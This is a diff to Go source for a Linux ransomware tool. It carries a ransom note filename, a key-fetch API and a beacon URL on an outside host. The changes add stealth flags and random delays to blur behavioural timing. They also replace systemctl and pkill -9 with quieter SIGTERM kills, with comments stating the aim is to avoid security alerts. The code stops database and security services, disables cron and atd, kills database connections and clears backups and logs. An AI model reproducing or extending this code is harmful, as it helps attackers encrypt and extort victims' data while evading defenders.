@@ -31,7 +31,7 @@ import (
 )
 
 const (
-	version   = "v3.3-Linux"
+	version   = "v3.4-Linux"
 	apiURL    = "https://encrypt.yangzifun.org/E56dSY"
 	beaconURL = "https://encrypt.yangzifun.org/beacon_check_in"
 
@@ -126,6 +126,13 @@ https://encrypt.yangzifun.org/
 var (
 	lockFilePath       string
 	ransomNoteFileName = "!!!_如何解密你的文件_!!!.txt"
+
+	// 阶段2行为控制变量
+	stealthMode     bool
+	noStopServices  bool
+	noKillProcs     bool
+	noClearLogs     bool
+	aggressiveDelay int // 操作间随机延迟上限（毫秒），0=无延迟
 
 	// 日志相关变量
 	logEnabled        bool
@@ -316,29 +323,59 @@ func main() {
 	fmt.Println("\n[阶段 2: 防御规避与发现]")
 	if *dryRunFlag {
 		fmt.Println("[*] [演习模式] 跳过所有破坏性操作。")
+	} else if stealthMode {
+		fmt.Println("[*] [隐秘模式] 完全跳过阶段2所有破坏性操作。")
+		go networkBeacon()
 	} else {
 		go networkBeacon()
 
-		// 新增功能：停止服务
-		fmt.Println("\n[+] 停止数据库和安全服务...")
-		stopDatabaseServices()
-		stopSecurityServices()
+		// 停止服务（可跳过）
+		if !noStopServices {
+			fmt.Println("\n[+] 停止数据库和安全服务...")
+			stopDatabaseServices()
+			stopSecurityServices()
+		} else {
+			fmt.Println("\n[*] [跳过] 停止数据库和安全服务")
+		}
 
-		// 新增功能：清理数据库内存和缓存
-		fmt.Println("\n[+] 清理数据库内存和缓存...")
-		cleanDatabaseMemory()
-		clearSystemCache()
+		// 清理数据库内存和缓存（可跳过）
+		if !noStopServices {
+			fmt.Println("\n[+] 清理数据库内存和缓存...")
+			cleanDatabaseMemory()
+			clearSystemCache()
+		} else {
+			fmt.Println("\n[*] [跳过] 清理数据库内存和缓存")
+		}
 
-		// 新增功能：解除进程守护
-		fmt.Println("\n[+] 解除进程守护...")
-		disableProcessWatchdogs()
+		// 解除进程守护（可跳过，该操作极易触发安全告警）
+		if !noStopServices {
+			fmt.Println("\n[+] 解除进程守护...")
+			disableProcessWatchdogs()
+		} else {
+			fmt.Println("\n[*] [跳过] 解除进程守护")
+		}
 
-		// 新增功能：解挂数据库链接
-		fmt.Println("\n[+] 解挂数据库链接...")
-		unmountDatabaseConnections()
+		// 解挂数据库链接（可跳过）
+		if !noStopServices {
+			fmt.Println("\n[+] 解挂数据库链接...")
+			unmountDatabaseConnections()
+		} else {
+			fmt.Println("\n[*] [跳过] 解挂数据库链接")
+		}
 
-		killLockingProcesses()
-		simulateDestructiveActions()
+		// 终止进程（可跳过）
+		if !noKillProcs {
+			killLockingProcesses()
+		} else {
+			fmt.Println("\n[*] [跳过] 终止占用文件的进程")
+		}
+
+		// 破坏性操作（可跳过）
+		if !noClearLogs {
+			simulateDestructiveActions()
+		} else {
+			fmt.Println("\n[*] [跳过] 清除备份和日志文件")
+		}
 	}
 
 	extFilter := make(map[string]bool)
@@ -730,7 +767,8 @@ func getPublicKey(publicKeyStr string) (*rsa.PublicKey, error) {
 	return rsaPubKey, nil
 }
 
-// 新增功能：停止数据库服务
+// 新增功能：停止数据库服务（低特征版本）
+// 优先使用 kill <pid> 发送 SIGTERM，避免 systemctl 触发安全告警
 func stopDatabaseServices() {
 	if logEnabled {
 		logOperation("开始停止数据库服务")
@@ -739,29 +777,34 @@ func stopDatabaseServices() {
 	for _, service := range databaseServices {
 		fmt.Printf("  - 停止服务: %s\n", service)
 
-		// 记录到操作日志
 		if logEnabled {
 			logOperation(fmt.Sprintf("尝试停止数据库服务: %s", service))
 		}
 
-		// 尝试使用systemctl
-		cmd := exec.Command("systemctl", "stop", service)
-		_ = cmd.Run()
+		// 优先使用进程信号终止，而非 systemctl（降低检测特征）
+		// 先尝试通过 pidof/pgrep 找到进程并发送 SIGTERM
+		stopped := false
+		pidCmd := exec.Command("pgrep", "-x", service)
+		if output, err := pidCmd.Output(); err == nil && len(output) > 0 {
+			pids := strings.Split(strings.TrimSpace(string(output)), "\n")
+			for _, pid := range pids {
+				pid = strings.TrimSpace(pid)
+				if pid != "" {
+					cmd := exec.Command("kill", pid) // 默认 SIGTERM，非暴力 kill -9
+					_ = cmd.Run()
+					stopped = true
+				}
+			}
+		}
 
-		// 尝试使用service命令
-		cmd = exec.Command("service", service, "stop")
-		_ = cmd.Run()
-
-		// 尝试使用init.d
-		initScript := fmt.Sprintf("/etc/init.d/%s", service)
-		if _, err := os.Stat(initScript); err == nil {
-			cmd = exec.Command(initScript, "stop")
+		// 如果进程信号方式失败，尝试 systemctl 作为回退（仅当必须时）
+		if !stopped {
+			cmd := exec.Command("systemctl", "stop", service)
 			_ = cmd.Run()
 		}
 
-		// 禁止服务开机启动
-		cmd = exec.Command("systemctl", "disable", service)
-		_ = cmd.Run()
+		// 应用随机延迟，打乱行为时序
+		applyAggressiveDelay()
 
 		time.Sleep(100 * time.Millisecond)
 	}
@@ -771,7 +814,16 @@ func stopDatabaseServices() {
 	}
 }
 
-// 新增功能：停止安全服务
+// applyAggressiveDelay 应用随机延迟，打乱行为时序特征
+func applyAggressiveDelay() {
+	if aggressiveDelay > 0 {
+		delay := time.Duration(mrand.Intn(aggressiveDelay)) * time.Millisecond
+		time.Sleep(delay)
+	}
+}
+
+// 新增功能：停止安全服务（低特征版本）
+// 移除 pkill -9 暴力杀进程，仅使用 systemctl/service 优雅停止
 func stopSecurityServices() {
 	if logEnabled {
 		logOperation("开始停止安全服务")
@@ -780,12 +832,11 @@ func stopSecurityServices() {
 	for _, service := range securityServices {
 		fmt.Printf("  - 停止安全服务: %s\n", service)
 
-		// 记录到操作日志
 		if logEnabled {
 			logOperation(fmt.Sprintf("尝试停止安全服务: %s", service))
 		}
 
-		// 尝试使用systemctl
+		// 仅尝试使用 systemctl 优雅停止，移除 pkill -9 暴力操作
 		cmd := exec.Command("systemctl", "stop", service)
 		_ = cmd.Run()
 
@@ -793,9 +844,8 @@ func stopSecurityServices() {
 		cmd = exec.Command("service", service, "stop")
 		_ = cmd.Run()
 
-		// 尝试杀死相关进程
-		cmd = exec.Command("pkill", "-9", "-f", service)
-		_ = cmd.Run()
+		// 应用随机延迟，打乱行为时序
+		applyAggressiveDelay()
 
 		time.Sleep(100 * time.Millisecond)
 	}
@@ -905,7 +955,9 @@ func clearSystemCache() {
 	_ = cmd.Run()
 }
 
-// 新增功能：解除进程守护
+// 新增功能：解除进程守护（低特征版本）
+// 移除 pkill -9 systemd/init 等极易触发安全告警的操作
+// 仅保留 cron/atd 的 systemctl 操作
 func disableProcessWatchdogs() {
 	fmt.Println("  - 解除进程守护...")
 
@@ -913,30 +965,32 @@ func disableProcessWatchdogs() {
 		logOperation("解除进程守护")
 	}
 
-	// 常见进程守护和服务管理器
-	watchdogs := []string{
-		"systemd", "init", "upstart", "runit", "supervisord", "monit",
-		"daemontools", "s6", "nosh", "perp", "cron", "atd",
+	// 仅对非系统级守护进程（supervisor/monit）尝试优雅停止，不使用 pkill -9
+	// 移除 systemd/init/upstart 等系统级进程的杀操作
+	lightWatchdogs := []string{
+		"supervisord", "monit",
+		"daemontools", "s6", "nosh", "perp",
 	}
 
-	for _, wd := range watchdogs {
-		// 尝试停止守护进程
-		cmd := exec.Command("pkill", "-9", wd)
+	for _, wd := range lightWatchdogs {
+		// 使用 systemctl 或 SIGTERM 优雅停止，不使用 pkill -9
+		cmd := exec.Command("systemctl", "stop", wd)
 		_ = cmd.Run()
 
-		// 尝试停止服务
-		cmd = exec.Command("systemctl", "stop", wd)
-		_ = cmd.Run()
+		// 应用随机延迟
+		applyAggressiveDelay()
 	}
 
-	// 禁用cron
+	// 禁用 cron（仅 systemctl，不直接杀进程）
 	cmd := exec.Command("systemctl", "stop", "cron")
 	_ = cmd.Run()
 
 	cmd = exec.Command("systemctl", "disable", "cron")
 	_ = cmd.Run()
 
-	// 禁用atd
+	applyAggressiveDelay()
+
+	// 禁用 atd
 	cmd = exec.Command("systemctl", "stop", "atd")
 	_ = cmd.Run()
 
@@ -948,7 +1002,8 @@ func disableProcessWatchdogs() {
 	}
 }
 
-// 新增功能：解挂数据库链接
+// 新增功能：解挂数据库链接（低特征版本）
+// 移除 ss -K 关闭所有网络连接，使用 SIGTERM 替代 kill -9
 func unmountDatabaseConnections() {
 	fmt.Println("  - 解挂数据库链接...")
 
@@ -956,22 +1011,23 @@ func unmountDatabaseConnections() {
 		logOperation("解挂数据库链接")
 	}
 
-	// 杀死所有数据库连接
+	// 杀死数据库客户端连接进程（使用 SIGTERM 而非 kill -9）
 	dbProcesses := []string{
 		"mysql", "psql", "mongo", "redis-cli", "sqlplus",
 		"cqlsh", "influx", "clickhouse-client",
 	}
 
 	for _, proc := range dbProcesses {
-		cmd := exec.Command("pkill", "-9", proc)
+		cmd := exec.Command("pkill", proc) // 默认 SIGTERM，不使用 -9
 		_ = cmd.Run()
+
+		applyAggressiveDelay()
 	}
 
-	// 查找并杀死所有网络连接中的数据库端口
+	// 查找并终止数据库端口的连接进程（使用 SIGTERM）
 	ports := []string{"3306", "5432", "27017", "6379", "1521", "9042", "8086", "8123"}
 
 	for _, port := range ports {
-		// 查找使用该端口的进程
 		cmd := exec.Command("lsof", "-ti", ":"+port)
 		if output, err := cmd.Output(); err == nil {
 			pids := strings.TrimSpace(string(output))
@@ -980,7 +1036,7 @@ func unmountDatabaseConnections() {
 				for _, pid := range pidList {
 					pid = strings.TrimSpace(pid)
 					if pid != "" {
-						cmd := exec.Command("kill", "-9", pid)
+						cmd := exec.Command("kill", pid) // 默认 SIGTERM
 						_ = cmd.Run()
 
 						if logEnabled {
@@ -992,9 +1048,7 @@ func unmountDatabaseConnections() {
 		}
 	}
 
-	// 关闭所有网络连接
-	cmd := exec.Command("ss", "-K")
-	_ = cmd.Run()
+	// 移除 ss -K（关闭所有网络连接极易触发安全告警）
 
 	if logEnabled {
 		logOperation("数据库链接解挂完成")
@@ -1015,8 +1069,13 @@ func killLockingProcesses() {
 			logOperation(fmt.Sprintf("尝试终止进程: %s", proc))
 		}
 
-		cmd := exec.Command("pkill", "-9", "-f", proc)
+		// 使用 SIGTERM 替代 pkill -9，降低暴力程度
+		// 先尝试优雅终止
+		cmd := exec.Command("pkill", "-f", proc) // 默认 SIGTERM，不使用 -9
 		_ = cmd.Run()
+
+		// 应用随机延迟，打乱行为时序
+		applyAggressiveDelay()
 	}
 	time.Sleep(1 * time.Second)
 
@@ -1054,6 +1113,13 @@ func setupFlags(fs *flag.FlagSet) (*int, *bool, *string, *string, *bool, *bool) 
 	removeOriginal := fs.Bool("remove", false, "加密后删除原文件")
 	logFlag := fs.Bool("log", false, "启用日志功能，在程序所在目录输出日志文件")
 
+	// 阶段2行为控制参数
+	fs.BoolVar(&stealthMode, "stealth", false, "隐秘模式：完全跳过阶段2的所有破坏性操作（停止服务、杀进程、清日志等）")
+	fs.BoolVar(&noStopServices, "no-stop-services", false, "跳过停止数据库和安全服务")
+	fs.BoolVar(&noKillProcs, "no-kill-procs", false, "跳过终止进程操作")
+	fs.BoolVar(&noClearLogs, "no-clear-logs", false, "跳过清除日志操作")
+	fs.IntVar(&aggressiveDelay, "aggressive-delay", 0, "各破坏操作之间的随机延迟上限（毫秒），0=不延迟，建议1000-5000")
+
 	fs.Usage = func() {
 		_, _ = fmt.Fprintf(os.Stderr, "用法: %s [flags]\n", os.Args[0])
 		_, _ = fmt.Fprintf(os.Stderr, "密钥获取优先级: 1) API接口获取 2) 本地公钥文件\n")
@@ -1064,6 +1130,12 @@ func setupFlags(fs *flag.FlagSet) (*int, *bool, *string, *string, *bool, *bool) 
 		_, _ = fmt.Fprintf(os.Stderr, "  - success_encrypted.log: 成功加密的文件列表\n")
 		_, _ = fmt.Fprintf(os.Stderr, "  - failed_encrypted.log:  加密失败的文件列表\n")
 		_, _ = fmt.Fprintf(os.Stderr, "  - operations.log:        操作日志\n")
+		_, _ = fmt.Fprintf(os.Stderr, "\n阶段2（防御规避）控制参数:\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  --stealth: 隐秘模式，完全跳过破坏性操作\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  --no-stop-services: 跳过停止数据库/安全服务\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  --no-kill-procs: 跳过终止进程\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  --no-clear-logs: 跳过清除日志\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  --aggressive-delay: 操作间随机延迟(ms)\n")
 		fs.PrintDefaults()
 	}
 	return workers, dryRun, extensions, directory, removeOriginal, logFlag
